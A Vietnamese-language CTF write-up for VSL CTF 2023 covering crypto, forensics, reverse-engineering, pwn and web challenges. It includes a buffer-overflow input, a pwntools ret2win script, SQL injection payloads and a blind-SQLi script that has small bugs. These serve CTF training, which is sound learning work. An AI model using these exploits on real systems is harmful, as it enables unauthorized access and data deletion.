---
title: "VSL CTF 2023 - Internal"
description: "VSL CTF 2023 - Internal Writeup"
summary: "VSL CTF 2023 - Internal Writeup"
categories: ["Writeup"]
tags: ["Web", "PWN", "Reverse", "Forensic", "Cryptography", "OSINT"]
#externalUrl: ""
date: 2023-12-21
draft: false
authors:
  - shr3wd
---

# WRITEUP VSL CTF Internal 2023

## Cryptography

### base64

Đây là mã hóa base64

Use this website to solve: [Decode Base64](https://www.base64decode.org/)

![Alt text](writeup-vsl-ctf-internal-2023/image1.png)

### caesar

Use this website to solve: [Decode __Caesar__](https://caesarcipher.net/)
Beacause, we don't know key. So, we must try each key to correct.
After try hard, we found key is 10.

![Alt text](writeup-vsl-ctf-internal-2023/image2.png)

### encrypt_continous

1. Đầu tiên, giải mã Hex
    Có thể dùng tool online sau: <https://www.convertstring.com/vi/EncodeDecode/HexDecode>

    ![Alt text](writeup-vsl-ctf-internal-2023/image3.png)

    - Giải mã nó được một chuỗi mã hóa base64

2. Giải mã base64:
    Dùng công cụ sau để giải mã base64
    <https://www.base64decode.org/>

    ![Alt text](writeup-vsl-ctf-internal-2023/image4.png)
    - Giải mã thu được mã Morse
3. Giải mã Morse
    Dùng trang web sau để giải mã mã Morse
    <https://morsedecoder.com/>

    ![Alt text](writeup-vsl-ctf-internal-2023/image5.png)
    - Giải mã thu được mã nhị phân
4. Giải mã nhị phân
    Dùng trang web sau để giải mã nhị phân
    <https://www.rapidtables.com/convert/number/binary-to-ascii.html>

    ![Alt text](writeup-vsl-ctf-internal-2023/image6.png)
    - Giải mã nó được một chuỗi mã hóa base64
5. Giải mã base64:
    Dùng công cụ sau để giải mã base64
    <https://www.base64decode.org/>

    ![Alt text](writeup-vsl-ctf-internal-2023/image7.png)
    - Giải mã thu được flag là: `VKU{3ncrypt_c0nt1n0u5}`

### Hash

This is hash encryption

Use website to solve: <https://crackstation.net/>

![Alt text](writeup-vsl-ctf-internal-2023/image8.png)

Flag: *hellokitty123*

### RSA

Để giải thử thách này có 2 cách:

1. Online

    Dùng website sau để giải:

    <https://www.dcode.fr/rsa-cipher>

    ![Alt text](writeup-vsl-ctf-internal-2023/image9.png)
2. Thủ công

    Đoạn mã Python để giải mã

    ```python
    from Crypto.Util.number import long_to_bytes
    import math

    n = 148415912934398595973584524642410725287
    c = 41746678175375382631128927535955680708
    e = 17

    p = 9708851719756433627 
    q =  15286659763521644581

    phi = (p-1)*(q-1)
    print(math.gcd(e,phi))

    d = pow(e,-1,phi)
    flag = pow(c,d,n)
    print(long_to_bytes(flag))
    ```

    ![Alt text](writeup-vsl-ctf-internal-2023/image10.png)

`Flag: VKU{RSA_3asy}`

## Forensic

### Baby shark do do doooo

- Tải công cụ Wireshark - Đây là công cụ dùng để phân tích các gói tin.
- Mở file thử thách lên bằng Wireshark
![Alt text](writeup-vsl-ctf-internal-2023/image11.png)
Dùng tính năng Export Object: **File -> Export Object -> FTP-DATA**
![Alt text](writeup-vsl-ctf-internal-2023/image12.png)
Có một file là **private.pdf**
![Alt text](writeup-vsl-ctf-internal-2023/image13.png)
Chọn file này và bấm Save để lưu file. Sau đó mở file lên sẽ thấy được flag

![Alt text](writeup-vsl-ctf-internal-2023/image14.png)

`Flag: VKU{FLAG_IS_PDF_WIRE_SHARK}`

### Compresssss

Dùng công cụ Binwalk thì phát hiện được file ảnh này có chứa một file zip

![Alt text](writeup-vsl-ctf-internal-2023/image15.png)

Đổi đuôi file thành zip và tiến hành giải nén

![Alt text](writeup-vsl-ctf-internal-2023/image16.png)

Pass giải nén được hiển thị ở trong tấm ảnh

![Alt text](writeup-vsl-ctf-internal-2023/image17.png)

Giải nén ra sẽ có file flag.txt.
Đọc nội dung file flag.txt sẽ lấy được flag.

`Flag: VKU{1s_1t_r34lly_a_ph0t0?}`

### Find me

Để giải bài này. Bạn có thể dùng lệnh **find** hoặc **grep** trong Linux

```bash
grep -r -l "VKU{" .
```

![Alt text](writeup-vsl-ctf-internal-2023/image18.png)
![Alt text](writeup-vsl-ctf-internal-2023/image19.png)

`Flag: VKU{h1h1_y0u_4r3_s0_g00d}`

### Osint

> Tìm tên của cô nhân viên Rumania Desancho ở trên mạng xã hội Threads. Bạn sẽ thấy một bài đăng kỷ niệm 5 năm làm việc trong công ty của cô ấy. Bài viết này kèm một bức ảnh. Bức ảnh đó có chứa tên của công ty cô ấy

![Alt text](writeup-vsl-ctf-internal-2023/image20.png)

`Flag: VKU{fireeye}`

## PWN

### BOF Begin

Dùng IDA để phân tích mã nguồn của chương trình.

![Alt text](writeup-vsl-ctf-internal-2023/image21.png)

- Theo logic chương trình thì để lấy được **flag** thì biến `s1` phải có giá trị là `"admin"`.
- Ở đây, biến `s1` được khai báo, được gán giá trị là `"user"`. Tuy nhiên, theo đoạn code thì không có cách nào để thay đổi giá trị của biến `s1`.

- Mảng ký tự `s` được khai báo với 20 phần tử.

=> **Câu hỏi đặt ra**: Sẽ ra sao nếu truyền nhiều hơn 20 ký tự vào biến s? Những ký tự bị thừa ra sẽ đi về đâu?

- Với bài này, mình đã setup để việc tràn bộ đệm có thể xảy ra. Chúng ta sẽ tận dụng lỗi **Buffer Overflow** để thay đổi giá trị của biến `s1` thành `"admin"`
- Chỉ cần chúng ta truyền vào 20 ký tự bất kỳ để lấp đầy biến **s**, sau đó thêm vào chuỗi `"admin"` thì biến `s1` sẽ bị ghi đè bởi chuỗi `"admin"` bị thừa ra này. Lúc này đã thỏa mãn điều kiện để lấy được flag.

- Payload để chương trình trả về flag là: `AAAAAAAAAAAAAAAAAAAAadmin`

![Alt text](writeup-vsl-ctf-internal-2023/image22.png)

`Flag: VKU{buff3r_0v3rf10w_owa928qnas}`

### Christmas Store

Dùng IDA để phân tích mã nguồn.
Ở đây bạn có thể xem mã nguồn gốc của nó để tiết kiệm thời gian [Source.c](./../challenge/src/source.c)

Vậy để lấy được flag thì chúng ta phải tìm cách có 1 triệu $ để mua nó trong cửa hàng. Nhưng làm sao để kiếm được 1 củ $ này?

Admin said: Đây tiền đây, lấy mà mua =)))

![Alt text](writeup-vsl-ctf-internal-2023/image23.png)

---

Đùa thôi 😁, để kiếm được 1 triệu dollar này thì bạn hãy chú ý đến bước mua các món đồ khác trong cửa hàng. Sau khi chọn một ID món đồ, chương trình sẽ yêu cầu bạn nhập số lượng muốn mua. Ở đây, sẽ có 2 hướng khai thác:

**1. Truyền vào số âm:**

- Nếu bạn truyền vào một số âm vừa đủ thì bạn có thể lấy được 1 triệu dollar dễ dàng. Bởi vì công thức tính tiền của chương trình là:

`tiền trong ví của bạn = tiền trong ví - (giá trị món đồ) * số lượng`

- Vì số lượng bị âm nên phép trừ kia sẽ thành phép cộng

![Alt text](writeup-vsl-ctf-internal-2023/image24.png)

**2. Tận dụng lỗi tràn số nguyên:**

- Nếu bạn truyền một số lớn hơn giá trị của kiểu INT thì nó sẽ bị tràn và trả về giá trị giới hạn dưới của nó.
(Ví dụ: nếu truyền vào 2147483648 thì chương trình sẽ hiểu nó thành -2147483648)
- Lúc này bạn chỉ cần truyền vào một số đủ lớn để lấy được số tiền cần dung.
![Alt text](writeup-vsl-ctf-internal-2023/image25.png)

=> Bây giờ đã có đủ tiền, bạn chỉ cần mua flag và lấy nó thôi 😁

![Alt text](writeup-vsl-ctf-internal-2023/image26.png)

`Flag: VKU{buff3r_0v3rf10w_owa928qnas}`

### Integer Overflow

Dùng IDA để phân tích mã nguồn. Ở đây bạn có thể xem mã nguồn trực tiếp [source.c](./../challenge/src/source.c)

![Alt text](writeup-vsl-ctf-internal-2023/image27.png)

Chương trình này yêu cầu bạn nhập một con số sao cho nó bằng với -25122023.
Tuy nhiên chương trình lại không cho nhập số âm. Vậy phải làm sao?

---
Để giải quyết điều này, bạn phải tận dụng lỗi tràn số nguyên.
Bạn chỉ cần truyền một số đủ lớn sao cho vượt quá giới hạn của kiểu INT và trở về giới hạn dưới của nó đến khi đạt giá trị -25122023.

`Giới hạn của INT là: -2147483648 đến 2147483647`

Làm một số tính toán đơn giản: `2147483647 + ((-25122023)-(-2147483648)) + 1 = 4269845273`

Vậy số tối thiểu cần nhập để giải bài này là: `4269845273`

![Alt text](writeup-vsl-ctf-internal-2023/image28.png)

(Ngoài ra còn rất nhiều số khác: 8564812569, 12859779865, ...)

`Flag: VKU{1nt3g3r_0v3rfl0w_soq82}`

### Ret 2 Win

Dùng IDA để phân tích mã nguồn
Bạn có thể xem mã nguồn gốc của thử thách tại đây: [source.c](../challenge/src/source.c)

---
Phân tích mã nguồn, có một hàm là hàm `**hacked**` được dùng để đọc flag. Tuy nhiên hàm này lại không được gọi tới để sử dụng
![Alt text](writeup-vsl-ctf-internal-2023/image29.png)

Để khai thác bài này, chúng ta phải khai thác lỗi Buffer Overflow để ghi đè địa chỉ trả về của hàm main bằng địa chỉ của hàm `**hacked**`.

Mình đã viết một mã python để khai thác tự động thử thách này.
Xem và tải nó tại đây: [solve.py](./solve.py)

```python
from pwn import *

exe = "ret2win" # Thay nó bằng đường dẫn tới file ret2win
elf = context.binary = ELF(exe, checksec=False)

def find_eip_offset(payload):
   p = process(exe)
   p.sendlineafter(b"name:\n",payload)
   p.wait()
   return cyclic_find(p.corefile.eip)

# r = process(exe)

# Bỏ comment dòng dưới nếu muốn chạy trên server, đổi địa chỉ IP và port tương ứng
r = remote("61.14.233.78", 10002)

offset = find_eip_offset(cyclic(100))

hackedAdd = elf.symbols.hacked

rop = ROP(elf)
rop.hacked()
payload = flat({
   offset: rop.chain()
})

r.sendlineafter(b"name:\n", payload)
r.interactive()
```

Cách payload này hoạt động và cách giải tay mình sẽ hướng dẫn trong những buổi training tiếp theo.

![Alt text](writeup-vsl-ctf-internal-2023/image30.png)

`FLAG: VKU{r3t_t0_w1n_k0aon129sja}`

## Reverse Engineering

### Baby Rev 1

Bài này chỉ cần dùng IDA mở nó lên thì sẽ thấy được flag

![Alt text](writeup-vsl-ctf-internal-2023/image31.png)

`Flag: VKU{r3verse?_1ts_50_345y_r1ght?}`

### Baby Rev 2

Dùng IDA để phân tích mã nguồn của nó.
Bạn có thể xem mã nguồn của nó ở đây [babyRev2.c](../challenge/dist/babyRev2.c)

Ở đây, nhiệm vụ của bạn là nhập một chuỗi ký tự sao cho nó phải đúng với flag.
Trong chương trình này, flag đã bị chia thành nhiều phần nhỏ. Gộp nó lại bạn sẽ lấy được flag.

---

- Đầu tiên, input phải có độ dài 32 ký tự.

![Alt text](writeup-vsl-ctf-internal-2023/image32.png)

- Tiếp theo, copy 4 giá trị đầu của **input** vào biến **Destination**. Sau đó, so sánh nó với chuỗi "VKU{". Điều này tương đương với **input** phải có 4 ký tự đầu là `**VKU{**`, ký tự cuối có mã ASCII là **125** (125 tương đương với ký tự `}`)

![Alt text](writeup-vsl-ctf-internal-2023/image33.png)

```c
strncpy(Destination, Buffer, 4u);
Destination[4] = 0;
if ( !strcmp(Destination, "VKU{") && v7[27] == 125 )
{
    strncpy(Str1, v7, 0x15u);
    Str1[21] = 0;
    if ( !strcmp(Str1, midFlag) && v7[21] == 121 && v7[22] == 95 && v7[23] == 72 && v7[24] == 51 && v7[25] == 104 )
    {
    puts("Correct key!");
    printf("Flag: %s\n", Buffer);
    return 0;
    }
    else
    {
    puts("Incorrect key!");
    return -1;
    }
}
```

- Tiếp theo, chương trình lại copy 15 ký tự của input vào biến Str1. Sau đó so sánh nó với giá trị của biến midFlag có giá trị `**b4by_r3v3rs1ng_1s_3a5**`
![Alt text](writeup-vsl-ctf-internal-2023/image34.png)
- Sau đó, so sánh lần lượt các ký tự tiếp theo với các mã ASCII.
   - 121 = "y"
   - 95 = "_"
   - 72 = "H"
   - 51 = "3"
   - 104 = "h"
- Ở đây, IDA khi biên dịch sang mã giả C bị thiếu một phần. Đọc ở dạng mã máy sẽ thấy đoạn mã sau
![Alt text](writeup-vsl-ctf-internal-2023/image35.png)
So sánh ký tự kế cuối của input với giá trị ASCII 51 = "3".
- Lúc này, gộp các phần lại với nhau ta sẽ có được flag hoàn chỉnh: VKU{b4by_r3v3rs1ng_1s_3a5y_H3h3}

`Flag: VKU{b4by_r3v3rs1ng_1s_3a5y_H3h3}`

### Baby Rev 3

File class là file được biên dịch từ Java

Với bài này, có thể sử dụng các công cụ để dịch ngược file class trở thành file java như: JD-GUI, JADX.
Ở bài này, sử dụng tool online sau để đơn giản hóa:

<https://www.decompiler.com/>

Upload file lên và tiến hành Decompile thì thu được mã nguồn ban đầu của nó bằng Java

![Alt text](writeup-vsl-ctf-internal-2023/image36.png)

Ở đoạn code này, có một mảng là flag. Mảng này chính là flag.

`Flag: VKU{java_also_being_used_in_reversing}`

### Baby Rev 4

Dùng IDA để phân tích mã nguồn của chương trình.
Bạn có thể xem mã nguồn gốc của chương trình ở đây: [source](../dist/source.c)

---
Khi dùng IDA để phân tích mã nguồn thì hàm main sẽ như sau:

![Alt text](writeup-vsl-ctf-internal-2023/image37.png)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char Buffer[33]; // [esp+17h] [ebp-29h] BYREF
  FILE *Stream; // [esp+38h] [ebp-8h]
  int i; // [esp+3Ch] [ebp-4h]

  __main();
  Stream = fopen("flag.txt", "r+");
  if ( Stream )
  {
    fgets(Buffer, 33, Stream);
    encrypt(Buffer, 33);
    fseek(Stream, 0, 0);
    for ( i = 0; i <= 31; ++i )
      fprintf(Stream, "%d ", Buffer[i]);
    fclose(Stream);
    return 0;
  }
  else
  {
    perror("Error opening file");
    return 1;
  }
}
```

Chương trình sẽ lấy nội dung của file flag.txt sau đó mã hóa nó đi bằng hàm encrypt. Sau đó lại ghi nội dung đã mã hóa vào lại file flag.txt

Tiếp theo, phân tích mã nguồn của hàm encrypt thì sẽ được như sau:
![Alt text](writeup-vsl-ctf-internal-2023/image38.png)

```c
int __cdecl encrypt(int a1, int a2)
{
  int result; // eax
  int i; // [esp+Ch] [ebp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a2 )
      break;
    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ 0x10;
  }
  return result;
}
```

Vậy cách thức mã hóa sẽ là xor từng ký tự trong file flag.txt với giá trị 0x10.

Tính chất của xor: A ^ B = C thì A = B ^ C

Để giải mã flag.txt, mình đã viết một đoạn code python [solve.py](./solve.py)

```python
# Convert encrypted flag to array of hex values
encryptFlag = "70 91 69 107 98 35 102 117 98 99 35 79 115 32 125 114 33 126 35 79 103 33 100 120 79 115 98 105 96 100 32 109".split(" ")

flag = ""

for i in encryptFlag:
    flag += chr(int(i) ^ 0x10)

print(flag)
```

Chạy đoạn mã này và sẽ lấy lại nội dung ban đầu của file flag.txt:
![Alt text](writeup-vsl-ctf-internal-2023/image39.png)

`Flag: VKU{r3vers3_c0mb1n3_w1th_crypt0}`

## Web Exploitation

### Find Me

Để giải bài này, bạn cần phải dùng các công cụ scan đường dẫn web. (gobuster, ffuf, dirb, dirsearch, ...)
Ở đây, sẽ sử dụng **ffuf**

Cài đặt FFUF ở đường dẫn sau: [FFUF Github](https://github.com/ffuf/ffuf)

Dùng lệnh như sau: `ffuf -u <url trang web> -w <đường dẫn tới file wordlist>`

Lệnh để tìm thực tế:

```bash
ffuf -u http://192.168.0.12:8084/FUZZ.html -w ./wordlist
```

Chạy lệnh trên sẽ dò được file **flags.html**

![Alt text](writeup-vsl-ctf-internal-2023/image40.png)

Truy cập vào file này, xem source code HTML của nó bằng **CRTL + U**
Trong web này sẽ có một mã base64. Giải mã nó sẽ lấy được flag

![Alt text](writeup-vsl-ctf-internal-2023/image41.png)
`VktVe0ZMQUdfSElEREVOX1lPVV80cmFfR29vZF81N0lOR30=`

`FLAG: VKU{FLAG_HIDDEN_YOU_4ra_Good_57ING}`

### SQL Injection Level 1

Để giải bài này, bạn chỉ cần đăng nhập vào được trang web. Tuy nhiên không có tài khoản và cũng không có tính năng đăng ký tài khoản.
Ở đây, sử dụng lỗi SQL Injection để có thể đăng nhập được.

Bạn có thể hình dung câu truy vấn SQL để đăng nhập là: `SELECT * FROM users WHERE username = '$_POST[username]' and password = '$_POST[password]'
`
Điền username bằng `' or 1=1 -- ` còn mật khẩu thì bạn điền gì cũng được.

![Alt text](writeup-vsl-ctf-internal-2023/image42.png)

`Flag: VKU{VERY_very_E4s9}`

### SQL Injection Level 2

Đối với bài này, lỗi SQL Injection sẽ xuất hiện ở phần Search Product.
Khi bạn nhập các số 1-14 thì trang web sẽ lần lượt trả về các hình ảnh sản phẩm tương ứng với giá trị ID mà bạn nhập.

Tiến hành dò cột để thực hiện lệnh UNION

(Điều kiện để dùng câu lệnh UNION:

- Số lượng cột của các lệnh SELECT phải bằng nhau
- Cùng kiểu dữ liệu.

)
Sử dụng `1 UNION SELECT NULL, NULL` thì dò được số column của câu select là 2.

Tiếp theo, dò tên bảng và tên cột. (Cái này bọn mình sẽ giới thiệu với các bạn sau)

Dò tên của Database:

```sql
1 UNION SELECT NULL, DATABASE()
```

Dò tên bảng:

```sql
1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'sql_level2'
```

Dò tên cột:

```sql
1 UNION SELECT NULL, column_name from information_schema.columns where table_schema='sql_level2' and table_name='flags'
```

(Có hint tên bảng là: flags và tên cột là **flag** 😉😉)

Dùng payload: `1 UNION SELECT flag, flag from flags` sẽ lấy được flag.

![Alt text](writeup-vsl-ctf-internal-2023/image43.png)

`FLAG: VKU{FLAG_SQL_I_LEVEL_2_YOU 4RA G006}`

### SQL Injection Level 3


Ở thử thách này, trên trang web có 2 tính năng có thể dính SQL Injection là ADD và DELETE
![Alt text](writeup-vsl-ctf-internal-2023/image44.png)

Khi kiểm tra thì chỉ có tính năng DELETE sẽ dính lỗi SQLi.
Dùng payload `' or 1=1 -- ` để kiểm tra. Nhập giá trị này vào **username** cần xóa.
Sau khi Remove User bằng **Username** trên thì toàn bộ user đều bị xóa.
![Alt text](writeup-vsl-ctf-internal-2023/image45.png)
Từ đây, có thể tận dụng lỗ hổng này để tìm ra tên các bảng và các cột có trong Cơ sở dữ liệu.

Đây chúng ta phải sử dụng một phương pháp tấn công gọi là lỗ hổng SQL Injection Blind.

Mình đã viết một payload để giải bài này.
(Bạn cũng có thể tìm thấy payload này được public trên github thông qua gợi ý trên file **github.html**)

Xem và tải nó ở đây: [payload.py](./payload.py)

```python
import requests
import json
import base64
import sys

in_url = input("ENTER IP AND PORT FOR WEBSITE EXAMPLE: 123.124.533.345:9898 \n")
url = f"http://{in_url}/"
post_delete = "admin.php"
url_result = "users.html"
list_wordlist=list("abcdefghijklmnopqrstuvwxyz0123456789,ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*{}();")
encoded_data_get = {
    "data":"eyJyZXF1ZXN0TWV0aG9kIjoiZ2V0QWxsVXNlcnMifQ=="
}
encode_data_add ={
    "data":"eyJ1c2VybmFtZV9hZGRfc3FsIjoiaGFja2luZyIsInBhc3N3b3JkX2FkZF9zcWwiOiJoYWNraW5nIiwicmVxdWVzdE1ldGhvZCI6ImFkZFVzZXIifQ=="
}

json_data_get = json.dumps(encoded_data_get);
json_data_add = json.dumps(encode_data_add);

#GET LENGHT FOR STRING TABLE
length_table=0
while True:
    payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()) = {length_table} ; ##"
    encoded_data = base64.b64encode(dataClear.encode()).decode()
    data = {
        "data": encoded_data
    }
    json_data = json.dumps(data)

    response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
    response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
    response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
    response_data = json.loads(response_result.text)
    print(payload)
    if response_data == "EMPTY":
        break
    length_table+=1
#GET TABLE 
table_string=""
for i in range(1,length_table+1):
    for char in list_wordlist:
        payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()), {i}, 1) = '{char}') ; ##"
        encoded_data = base64.b64encode(dataClear.encode()).decode()
        data = {
            "data": encoded_data
        }
        json_data = json.dumps(data)

        response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
        response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
        response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
        response_data = json.loads(response_result.text)
        print(payload)
        if response_data == "EMPTY":
            table_string+=char
            break
table = table_string.split(",")
print(f"table is {table}")
for table_child in table:
    if table_child != 'flags_vku':
        continue
    #GET LENGHT COLUMNS
    lenght_colums=0
    while True:
        payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_child}') = {lenght_colums} ; ##"
        encoded_data = base64.b64encode(dataClear.encode()).decode()
        data = {
            "data": encoded_data
        }
        json_data = json.dumps(data)

        response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
        response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
        response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
        response_data = json.loads(response_result.text)
        print(payload)
        if response_data == "EMPTY":
            break
        lenght_colums+=1
    print(lenght_colums)
    #GET COLUMNS 
    columns_string=""
    for i in range(1,lenght_colums+1):
        for char in list_wordlist:
            payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_child}'), {i}, 1) = '{char}') ; ##"
            encoded_data = base64.b64encode(dataClear.encode()).decode()
            data = {
                "data": encoded_data
            }
            json_data = json.dumps(data)

            response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
            response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
            response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
            response_data = json.loads(response_result.text)
            print(payload)
            if response_data == "EMPTY":
                columns_string+=char
                break
    columns = columns_string.split(",")
    print(f"columns is {columns}")
    #GET LENGHT CONTENT
    lenght_content_table=0
    while True:
        payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT({columns[0]})) FROM {table_child}) = {lenght_content_table} ; ##"
        encoded_data = base64.b64encode(dataClear.encode()).decode()
        data = {
            "data": encoded_data
        }
        json_data = json.dumps(data)

        response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
        response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
        response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
        response_data = json.loads(response_result.text)
        print(payload)
        if response_data == "EMPTY":
            break
        lenght_content_table+=1
    print(lenght_content_table)
    #GET CONTENT TABLE
    table_string_content=""
    for i in range(1,lenght_content_table+1):
        for char in list_wordlist:
            payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT({columns[0]})) FROM {table_child}), {i}, 1) = '{char}') ; ##"
            encoded_data = base64.b64encode(dataClear.encode()).decode()
            data = {
                "data": encoded_data
            }
            json_data = json.dumps(data)

            response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
            response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
            response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
            response_data = json.loads(response_result.text)
            print(payload)
            if response_data == "EMPTY":
                table_string_content+=char
                break
    content_table = table_string_content.split(",")
    print(content_table)
    break
```

Chạy nó và bạn sẽ lấy được flag:
![Alt text](writeup-vsl-ctf-internal-2023/image46.png)

![Alt text](writeup-vsl-ctf-internal-2023/image47.png)

Chi tiết cách nó hoạt động, bọn mình sẽ giải thích vào những buổi training sau.

`FLAG: vku{levle_sqli_you_4re_7he_b3st}`
